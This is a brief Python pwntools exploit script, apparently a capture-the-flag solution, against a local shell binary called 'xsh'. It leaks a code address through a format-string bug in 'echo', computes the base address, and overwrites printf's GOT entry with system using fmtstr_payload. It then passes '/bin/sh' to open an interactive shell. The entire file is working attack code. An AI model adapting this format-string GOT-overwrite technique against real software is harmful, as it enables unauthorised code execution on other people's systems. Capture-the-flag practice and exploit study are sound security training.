from pwn import *

e = ELF('./xsh')
p = process('./xsh')

print p.recvuntil('$')
p.sendline('echo %1$p')
proc_base = int(p.recvline(),16) - 0x23ae

printf_addr = e.got['printf'] + proc_base
system_addr = e.symbols['system'] + proc_base

payload = 'echo '
payload += 'BBB'
payload += fmtstr_payload(25,{printf_addr:system_addr},numbwritten=3,write_size='short')

p.sendline(payload)
p.sendline('echo /bin/sh')
p.interactive()